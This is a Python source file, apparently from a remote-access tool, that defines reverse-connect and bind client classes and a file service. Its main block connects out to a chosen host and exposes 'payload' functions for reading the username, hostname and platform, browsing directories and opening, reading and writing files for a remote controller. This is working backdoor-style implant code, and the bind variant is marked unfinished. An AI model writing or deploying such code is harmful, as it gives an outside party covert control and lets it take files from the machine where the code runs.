# -*- coding: utf-8 -*-

import socket
import socketserver

from . import connection
from . import payload
from . import rpc


class ReverseClient:

    def __init__(self, address, RPCHandlerClass=payload.PayloadRPCHandler):
        self.address = address
        self.RPCHandlerClass = RPCHandlerClass
        self.socket = socket.create_connection(address)
        self.connection = connection.Connection(self.socket)
        self.rpc_handler = RPCHandlerClass()

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()

    def close(self):
        self.connection.close()

    def serve_forever(self):
        self.rpc_handler.handle_connection(self.connection)

    def register_function(self, *args, **kwargs):
        self.rpc_handler.register_function(*args, **kwargs)

    def register_instance(self, *args, **kwargs):
        self.rpc_handler.register_instance(*args, **kwargs)


class BindClient(socketserver.TCPServer):
    #TODO: get this BindClient working.

    def __init__(self, *args, RPCHandlerClass=payload.PayloadRPCHandler, **kwargs):
        super().__init__(*args, **kwargs)
        self._functions = dict()
        def create_rpc_handler():
            rpc_handler = RPCHandlerClass()
            for name, func in self._functions.items():
                rpc_handler.register_function(func, name)
            return rpc_handler
        self.RPCHandlerClass = create_rpc_handler

    def __enter__(self):
        return self

    def __exit__(self, *args, **kwargs):
        self.close()

    def close(self):
        self.server_close()
    
    def register_function(self, func, name=None):
        if name is None:
            name = func.__name__
        self._functions[name] = func


class ThreadingBindClient(socketserver.ThreadingMixIn, BindClient):
    pass


class FileService(payload.FileOpener, payload.FileReader, payload.FileWriter):
    pass


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('host',
            help='the host name or ip address to connect to. '
                 '[default: localhost]',
            default='localhost',
            nargs='?',
    )
    parser.add_argument('--port', '-p',
            help='the port number to connect to. '
                 '[default: 8000]',
            default=8000,
    )
    args = parser.parse_args()
    host, port = addr = args.host, args.port

    funcs = [payload.get_username,
            payload.get_hostname,
            payload.get_platform,
            payload.list_dir,
            payload.change_dir,
            payload.get_current_dir,
            payload.get_file_size,
    ]

    with ReverseClient(addr) as client:
        for f in funcs:
            client.register_function(f)
        client.register_instance(FileService())
        try:
            client.serve_forever()
        except connection.ConnectionClosed:
            pass

